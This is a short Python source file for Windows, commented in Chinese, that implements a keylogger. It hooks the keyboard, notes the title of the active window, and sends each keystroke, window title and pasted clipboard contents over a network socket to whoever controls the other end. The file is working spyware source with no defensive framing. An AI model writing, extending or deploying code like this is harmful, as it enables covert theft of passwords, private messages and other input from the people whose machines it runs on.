import win32clipboard
import pythoncom
from ctypes import *
import time

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None


def get_current_process():
    hwnd = user32.GetForegroundWindow()
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id = "%d" % pid.value
    executable = create_string_buffer(512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
    window_title = create_string_buffer(512)
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    return executable


def key_stroke(socket):
    def key_stroke_dep(event):
        global current_window
        if event.WindowName != current_window:
            current_window = event.WindowName
            # 得到当前敲击键盘事件的窗口
            window = "【"+str(current_window)+"】"
            socket.send(window.encode())
            time.sleep(0.1)
        # 键盘击键操作，数字对应键盘字符
        if 32 < event.Ascii < 127:
            socket.send(chr(event.Ascii).encode())
        else:
            # 针对control+V粘贴操作，获取剪切板内容
            if event.Key == "V":
                win32clipboard.OpenClipboard()
                pasted_value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                socket.send(pasted_value.encode())
            else:
                socket.send(event.Key.encode())
        return True

    return key_stroke_dep


def key_thread(client, event):
    event.KeyDown = key_stroke(client)
    event.HookKeyboard()
    pythoncom.PumpMessages()
    return 0
